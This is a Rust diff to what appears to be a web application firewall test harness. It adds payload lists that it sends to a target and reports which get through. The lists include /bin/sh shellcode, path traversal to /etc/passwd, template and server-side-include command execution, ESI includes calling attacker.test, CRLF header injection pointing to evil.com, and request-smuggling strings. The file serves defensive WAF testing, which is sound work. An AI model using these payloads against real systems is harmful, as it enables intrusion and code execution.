@@ -121,22 +121,115 @@ const SQLI_PAYLOADS: &[&str] = &[
     "' or true--",
 ];
 
+const OVERFLOW_PAYLOADS: &[&str] = &[
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "1111111111111111111111111111111111111111",
+    "%00%00%00%00%00%00%00%00%00%00%00%00",
+    "%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff",
+    "{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
+    "))))))))))))))))))))))))))))))))))))))))",
+    "../../../../../../../../../../../../etc/passwd",
+    "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
+    "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+    "id=12345678901234567890123456789012345678901234567890",
+    r"\x90\x90\x90\x90\xcc",
+    r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
+    r"\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x6a\x3b\x58\x0f\x05",
+    r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68",
+    "0x6a0x3b0x580x0f0x05",
+];
+
+const SSTI_PAYLOADS: &[&str] = &[
+    "{{7*7}}",
+    "{{= 7*7 }}",
+    "${7*7}",
+    "#{7*7}",
+    "<%= 7 * 7 %>",
+    "<% system('id') %>",
+    "{% debug %}",
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+    "#set($x = 7 * 7)${x}",
+    "[[${7*7}]]",
+];
+
+const SSI_PAYLOADS: &[&str] = &[
+    "<!--#include file=\"/etc/passwd\" -->",
+    "<!--#include virtual=\"/admin/config\" -->",
+    "<!--#exec cmd=\"id\" -->",
+    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
+    "<!--#printenv -->",
+    "<!--#config errmsg=\"owned\" -->",
+    "<!-- #exec cmd=\"/bin/sh -c id\" -->",
+    "<!--# set var=\"x\" value=\"owned\" -->",
+    "<!--#if expr=\"$QUERY_STRING\" -->",
+    "%3C%21--%23exec%20cmd%3D%22id%22%20--%3E",
+];
+
+const ESI_PAYLOADS: &[&str] = &[
+    "<esi:include src=\"http://attacker.test/poc\" />",
+    "<esi:inline name=\"frag\">owned</esi:inline>",
+    "<esi:debug/>",
+    "<!--esi <esi:include src=\"http://attacker.test/x\" /> -->",
+    "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
+    "<esi:remove><script>alert(1)</script></esi:remove>",
+    "<esi:choose><esi:when test=\"$(QUERY_STRING)\">x</esi:when></esi:choose>",
+    "<esi:try><esi:attempt>x</esi:attempt><esi:except>y</esi:except></esi:try>",
+    "<ESI:INCLUDE SRC=\"http://attacker.test/case\" />",
+    "%3Cesi%3Ainclude%20src%3D%22http%3A%2F%2Fattacker.test%2Fencoded%22%20%2F%3E",
+];
+
+const CRLF_PAYLOADS: &[&str] = &[
+    "%0d%0aSet-Cookie:admin=true",
+    "%0aSet-Cookie:admin=true",
+    "%0dSet-Cookie:admin=true",
+    "%0d%0aLocation:http://evil.com",
+    "%0d%0aHTTP/1.1%20200%20OK%0d%0a",
+    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
+    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
+    "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
+    "%250d%250aSet-Cookie:admin=true",
+    "%25250d%25250aSet-Cookie:admin=true",
+    "%u000d%u000aSet-Cookie:admin=true",
+    r"\u000d\u000aSet-Cookie:admin=true",
+    r"\r\nSet-Cookie:admin=true",
+    "%E5%98%8A%E5%98%8DSet-Cookie:admin=true",
+    "%C4%8D%C4%8ASet-Cookie:admin=true",
+    "%e0%80%8d%e0%80%8aSet-Cookie:admin=true",
+    "%00%0d%0aSet-Cookie:admin=true",
+    "%0d%0a%20Set-Cookie:admin=true",
+    "%0d%0a%09Set-Cookie:admin=true",
+    "test%0d%0aX-Forwarded-Host:evil.com",
+];
+
+const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
+    "Transfer-Encoding: chunked",
+    "transfer-encoding: chunked",
+    "Transfer-Encoding:%20chunked",
+    "Transfer-Encoding:%09chunked",
+    "X-Session-Hijack: true",
+    "x-session-hijack:%20true",
+    "Content-Length: 0",
+    "Content-Length: 4",
+    "GET / HTTP/1.1%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
+    "POST / HTTP/1.1%0d%0aContent-Length: 3%0d%0a%0d%0aabc",
+];
+
 const SCANNER_UAS: &[(&str, &str)] = &[
-    ("nikto/2.1.6",                         "Nikto"),
-    ("sqlmap/1.7",                           "sqlmap"),
-    ("Nmap Scripting Engine",                "Nmap"),
-    ("masscan/1.3",                          "masscan"),
-    ("nessus/10.0",                          "Nessus"),
-    ("openvas/21.4",                         "OpenVAS"),
-    ("gobuster/3.6",                         "gobuster"),
-    ("dirbuster/1.0",                        "DirBuster"),
-    ("arachni/1.5",                          "Arachni"),
-    ("nuclei/2.9",                           "Nuclei"),
-    ("wfuzz/3.1",                            "wfuzz"),
-    ("commix/3.8",                           "commix"),
+    ("nikto/2.1.6", "Nikto"),
+    ("sqlmap/1.7", "sqlmap"),
+    ("Nmap Scripting Engine", "Nmap"),
+    ("masscan/1.3", "masscan"),
+    ("nessus/10.0", "Nessus"),
+    ("openvas/21.4", "OpenVAS"),
+    ("gobuster/3.6", "gobuster"),
+    ("dirbuster/1.0", "DirBuster"),
+    ("arachni/1.5", "Arachni"),
+    ("nuclei/2.9", "Nuclei"),
+    ("wfuzz/3.1", "wfuzz"),
+    ("commix/3.8", "commix"),
     ("Mozilla/5.0 (compatible; netsparker/6.0)", "Netsparker"),
-    ("havij/1.17",                           "Havij"),
-    ("Acunetix Web Vulnerability Scanner",   "Acunetix"),
+    ("havij/1.17", "Havij"),
+    ("Acunetix Web Vulnerability Scanner", "Acunetix"),
 ];
 
 // ─── Result tracking ──────────────────────────────────────────────────────────
@@ -149,53 +242,76 @@ enum Outcome {
 }
 
 struct SweepResult {
-    label:   String,
+    label: String,
     outcome: Outcome,
 }
 
 // ─── CLI ──────────────────────────────────────────────────────────────────────
 
 struct Config {
-    target:      String,
-    verbose:     bool,
+    target: String,
+    verbose: bool,
     concurrency: usize,
 }
 
 fn parse_args() -> Config {
     let args: Vec<String> = std::env::args().collect();
-    let mut target      = "http://127.0.0.1:8080".to_string();
-    let mut verbose     = false;
+    let mut target = "http://127.0.0.1:8080".to_string();
+    let mut verbose = false;
     let mut concurrency = 20usize;
     let mut i = 1;
     while i < args.len() {
         match args[i].as_str() {
-            "--target"      | "-t" => { i += 1; if let Some(v) = args.get(i) { target = v.clone(); } }
-            "--verbose"     | "-v" => { verbose = true; }
-            "--concurrency" | "-c" => { i += 1; if let Some(v) = args.get(i) { concurrency = v.parse().unwrap_or(20); } }
+            "--target" | "-t" => {
+                i += 1;
+                if let Some(v) = args.get(i) {
+                    target = v.clone();
+                }
+            }
+            "--verbose" | "-v" => {
+                verbose = true;
+            }
+            "--concurrency" | "-c" => {
+                i += 1;
+                if let Some(v) = args.get(i) {
+                    concurrency = v.parse().unwrap_or(20);
+                }
+            }
             _ => {}
         }
         i += 1;
     }
-    Config { target, verbose, concurrency }
+    Config {
+        target,
+        verbose,
+        concurrency,
+    }
 }
 
 // ─── Output helpers ───────────────────────────────────────────────────────────
 
 fn outcome_icon(o: &Outcome) -> &'static str {
     match o {
-        Outcome::Blocked     => "[BLOCK]",
+        Outcome::Blocked => "[BLOCK]",
         Outcome::Bypassed(_) => "[PASS ]",
-        Outcome::Error(_)    => "[ERROR]",
+        Outcome::Error(_) => "[ERROR]",
     }
 }
 
 fn print_result(r: &SweepResult, verbose: bool) {
     match &r.outcome {
         Outcome::Blocked => {
-            if verbose { println!("  {} {}", outcome_icon(&r.outcome), r.label); }
+            if verbose {
+                println!("  {} {}", outcome_icon(&r.outcome), r.label);
+            }
         }
         Outcome::Bypassed(code) => {
-            println!("  {} {} (status {})", outcome_icon(&r.outcome), r.label, code);
+            println!(
+                "  {} {} (status {})",
+                outcome_icon(&r.outcome),
+                r.label,
+                code
+            );
         }
         Outcome::Error(msg) => {
             println!("  {} {} — {}", outcome_icon(&r.outcome), r.label, msg);
@@ -207,9 +323,9 @@ fn tally(results: &[SweepResult], verbose: bool) -> (usize, usize, usize) {
     let (mut b, mut p, mut e) = (0, 0, 0);
     for r in results {
         match r.outcome {
-            Outcome::Blocked     => b += 1,
+            Outcome::Blocked => b += 1,
             Outcome::Bypassed(_) => p += 1,
-            Outcome::Error(_)    => e += 1,
+            Outcome::Error(_) => e += 1,
         }
         print_result(r, verbose);
     }
@@ -223,10 +339,10 @@ fn tally(results: &[SweepResult], verbose: bool) -> (usize, usize, usize) {
 // collected in original payload order so output is deterministic.
 
 async fn sweep_post(
-    client:      &reqwest::Client,
-    base:        &str,
-    path:        &str,
-    payloads:    &[&str],
+    client: &reqwest::Client,
+    base: &str,
+    path: &str,
+    payloads: &[&str],
     concurrency: usize,
 ) -> Vec<SweepResult> {
     let url = Arc::new(format!("{base}{path}"));
@@ -234,9 +350,9 @@ async fn sweep_post(
     let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();
 
     for (idx, &payload) in payloads.iter().enumerate() {
-        let client  = client.clone();
-        let url     = url.clone();
-        let sem     = sem.clone();
+        let client = client.clone();
+        let url = url.clone();
+        let sem = sem.clone();
         let payload = payload.to_string();
         set.spawn(async move {
             let _permit = sem.acquire().await.unwrap();
@@ -247,10 +363,16 @@ async fn sweep_post(
                 .await
             {
                 Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
-                Ok(r)  => Outcome::Bypassed(r.status()),
+                Ok(r) => Outcome::Bypassed(r.status()),
                 Err(e) => Outcome::Error(e.to_string()),
             };
-            (idx, SweepResult { label: payload, outcome })
+            (
+                idx,
+                SweepResult {
+                    label: payload,
+                    outcome,
+                },
+            )
         });
     }
 
@@ -258,10 +380,10 @@ async fn sweep_post(
 }
 
 async fn sweep_get(
-    client:      &reqwest::Client,
-    base:        &str,
-    path:        &str,
-    payloads:    &[&str],
+    client: &reqwest::Client,
+    base: &str,
+    path: &str,
+    payloads: &[&str],
     concurrency: usize,
 ) -> Vec<SweepResult> {
     let url = Arc::new(format!("{base}{path}"));
@@ -269,9 +391,9 @@ async fn sweep_get(
     let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();
 
     for (idx, &payload) in payloads.iter().enumerate() {
-        let client  = client.clone();
-        let url     = url.clone();
-        let sem     = sem.clone();
+        let client = client.clone();
+        let url = url.clone();
+        let sem = sem.clone();
         let payload = payload.to_string();
         set.spawn(async move {
             let _permit = sem.acquire().await.unwrap();
@@ -282,10 +404,16 @@ async fn sweep_get(
                 .await
             {
                 Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
-                Ok(r)  => Outcome::Bypassed(r.status()),
+                Ok(r) => Outcome::Bypassed(r.status()),
                 Err(e) => Outcome::Error(e.to_string()),
             };
-            (idx, SweepResult { label: payload, outcome })
+            (
+                idx,
+                SweepResult {
+                    label: payload,
+                    outcome,
+                },
+            )
         });
     }
 
@@ -293,9 +421,9 @@ async fn sweep_get(
 }
 
 async fn sweep_ua(
-    client:      &reqwest::Client,
-    base:        &str,
-    path:        &str,
+    client: &reqwest::Client,
+    base: &str,
+    path: &str,
     concurrency: usize,
 ) -> Vec<SweepResult> {
     let url = Arc::new(format!("{base}{path}"));
@@ -304,10 +432,10 @@ async fn sweep_ua(
 
     for (idx, &(ua, name)) in SCANNER_UAS.iter().enumerate() {
         let client = client.clone();
-        let url    = url.clone();
-        let sem    = sem.clone();
-        let ua     = ua.to_string();
-        let label  = format!("{name} ({ua})");
+        let url = url.clone();
+        let sem = sem.clone();
+        let ua = ua.to_string();
+        let label = format!("{name} ({ua})");
         set.spawn(async move {
             let _permit = sem.acquire().await.unwrap();
             let outcome = match client
@@ -318,7 +446,7 @@ async fn sweep_ua(
                 .await
             {
                 Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
-                Ok(r)  => Outcome::Bypassed(r.status()),
+                Ok(r) => Outcome::Bypassed(r.status()),
                 Err(e) => Outcome::Error(e.to_string()),
             };
             (idx, SweepResult { label, outcome })
@@ -329,10 +457,7 @@ async fn sweep_ua(
 }
 
 // Drains a JoinSet and returns results sorted by original index.
-async fn collect_ordered(
-    set: &mut JoinSet<(usize, SweepResult)>,
-    len: usize,
-) -> Vec<SweepResult> {
+async fn collect_ordered(set: &mut JoinSet<(usize, SweepResult)>, len: usize) -> Vec<SweepResult> {
     let mut indexed = Vec::with_capacity(len);
     while let Some(res) = set.join_next().await {
         if let Ok(item) = res {
@@ -363,37 +488,211 @@ async fn main() {
     println!("  Verbose     : {}", cfg.verbose);
     println!();
 
-    let mut total_blocked  = 0usize;
+    let mut total_blocked = 0usize;
     let mut total_bypassed = 0usize;
-    let mut total_errors   = 0usize;
+    let mut total_errors = 0usize;
 
     macro_rules! run_sweep {
         ($label:expr, $fut:expr) => {{
             println!("━━━ {} ━━━", $label);
             let results = $fut.await;
             let (b, p, e) = tally(&results, cfg.verbose);
-            total_blocked  += b;
+            total_blocked += b;
             total_bypassed += p;
-            total_errors   += e;
+            total_errors += e;
             println!("  → {b} blocked  |  {p} bypassed  |  {e} errors\n");
         }};
     }
 
     run_sweep!(
         format!("XSS — POST /test_post ({} payloads)", XSS_PAYLOADS.len()),
-        sweep_post(&client, &cfg.target, "/test_post", XSS_PAYLOADS, cfg.concurrency)
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            XSS_PAYLOADS,
+            cfg.concurrency
+        )
     );
     run_sweep!(
         format!("XSS — GET /test_get ({} payloads)", XSS_PAYLOADS.len()),
-        sweep_get(&client, &cfg.target, "/test_get", XSS_PAYLOADS, cfg.concurrency)
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            XSS_PAYLOADS,
+            cfg.concurrency
+        )
     );
     run_sweep!(
         format!("SQLi — GET /test_get ({} payloads)", SQLI_PAYLOADS.len()),
-        sweep_get(&client, &cfg.target, "/test_get", SQLI_PAYLOADS, cfg.concurrency)
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            SQLI_PAYLOADS,
+            cfg.concurrency
+        )
     );
     run_sweep!(
         format!("SQLi — POST /test_post ({} payloads)", SQLI_PAYLOADS.len()),
-        sweep_post(&client, &cfg.target, "/test_post", SQLI_PAYLOADS, cfg.concurrency)
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            SQLI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "Overflow DFA — GET /test_get ({} payloads)",
+            OVERFLOW_PAYLOADS.len()
+        ),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            OVERFLOW_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "Overflow DFA — POST /test_post ({} payloads)",
+            OVERFLOW_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            OVERFLOW_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "SSTI DFA — GET /test_get ({} payloads)",
+            SSTI_PAYLOADS.len()
+        ),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            SSTI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "SSTI DFA — POST /test_post ({} payloads)",
+            SSTI_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            SSTI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!("SSI DFA — GET /test_get ({} payloads)", SSI_PAYLOADS.len()),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            SSI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "SSI DFA — POST /test_post ({} payloads)",
+            SSI_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            SSI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!("ESI DFA — GET /test_get ({} payloads)", ESI_PAYLOADS.len()),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            ESI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "ESI DFA — POST /test_post ({} payloads)",
+            ESI_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            ESI_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "CRLF DFA — GET /test_get ({} payloads)",
+            CRLF_PAYLOADS.len()
+        ),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            CRLF_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "CRLF DFA — POST /test_post ({} payloads)",
+            CRLF_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            CRLF_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "Request smuggling DFA — GET /test_get ({} payloads)",
+            REQUEST_SMUGGLING_PAYLOADS.len()
+        ),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            REQUEST_SMUGGLING_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "Request smuggling DFA — POST /test_post ({} payloads)",
+            REQUEST_SMUGGLING_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            REQUEST_SMUGGLING_PAYLOADS,
+            cfg.concurrency
+        )
     );
     run_sweep!(
         format!("Scanner UA — GET /test_get ({} UAs)", SCANNER_UAS.len()),
@@ -412,8 +711,10 @@ async fn main() {
     if total_bypassed == 0 && total_errors == 0 {
         println!("║  Status         : ALL PAYLOADS BLOCKED ✓               ║");
     } else if total_bypassed > 0 {
-        println!("║  Status         : !! {} PAYLOAD(S) BYPASSED WAF !!{:<7}║",
-                 total_bypassed, "");
+        println!(
+            "║  Status         : !! {} PAYLOAD(S) BYPASSED WAF !!{:<7}║",
+            total_bypassed, ""
+        );
     }
     println!("╚══════════════════════════════════════════════════════════╝");
     println!();
